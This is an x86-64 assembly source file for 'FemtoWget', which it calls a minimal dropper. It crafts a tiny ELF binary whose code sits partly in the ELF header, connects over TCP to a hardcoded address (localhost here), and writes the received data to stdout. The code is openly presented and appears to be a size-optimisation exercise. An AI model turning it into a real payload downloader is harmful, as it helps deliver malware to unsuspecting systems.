;;; 
;;;  *  fwget1. FemtoWget. Minimal dropper in asm (FINAL)
;;;  *  Copyright (c) 2020 pico (@0x00pico at twitter)
;;;  *
;;;  *  This program is free software: you can redistribute it and/or modify
;;;  *  it under the terms of the GNU General Public License as published by
;;;  *  the Free Software Foundation, either version 3 of the License, or
;;;  *  (at your option) any later version.
;;;  *  This program is distributed in the hope that it will be useful,
;;;  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
;;;  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;;;  *  GNU General Public License for more details.
;;;  *  You should have received a copy of the GNU General Public License
;;;  *  along with this program.  If not, see <http://www.gnu.org/licenses/>.

	BITS 64
;;; ELF header.... we make use of the 8 bytes available in the header
	org 0x400000
BUF_SIZE:	equ 1024
  ehdr:                                                 ; Elf64_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
_start:
	xor edi,edi		; 31 ff
	inc edi                 ; ff c7
	push rdi		; 57
	pop  rsi		; 5e
	jmp _start1		; eb XX 


                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr

	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget
	;;  https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7
_start1:
	inc edi
	mov edx, 6              ; IPPROTO_TCP
	
	;; socket (AF_INET=2, SOCK_STREAM = 1, IPPROTO_TCP=6)
	call _socket
	mov ebx, eax		; Store socket on ebx
	;;  It is unlikely that the socket syscall will fail. No check for errors
	

	;; connect (s [rbp+0], addr, 16)
	mov edi, eax		; Saves 1 byte
	lea rsi, [rel addr]
	add edx,10
	
	call _connect
	;;	Just skip error check... if it fails is not gonna work anyway
	
	lea rsi, [rsp]	 ; Just use the stack as buffer.... we should decrement it
l0:				; Read loop
	;; Read data from socket
	;; _read (s = rbx, buf= [rsp], 1024);

	mov edi, ebx
	mov edx, BUF_SIZE
	call _read
	cmp eax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rsp], rax)
	xor edi,edi
	inc edi			; rdi = 1
	mov edx, eax		; get len from _read
	call _write
	cmp eax, BUF_SIZE
	jl done
	jmp l0
done:
	;;  _close (s)
	;;	File descriptors get closed automatically when the process dies

	;; We do not care about exit code
	call _exit		

	
	;; Syscalls
_read:
	xor eax,eax
	jmp _do_syscall
	
_write:
	xor eax,eax
	inc eax

	jmp _do_syscall
	
_socket:
	;; mov rax, 41
	xor eax,eax
	add al, 41
	jmp _do_syscall
	
_connect:
	;; 	mov rax, 42
	xor eax,eax
	add al, 42
	jmp _do_syscall
	
_close:
	;; mov rax, 3
	xor eax,eax
	add al, 3
	jmp _do_syscall
	
_exit:
	xor eax,eax
	add al, 60
	;;  	mov rax, 60
	;; 	jmp _do_syscall

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
filesize equ $ - $$
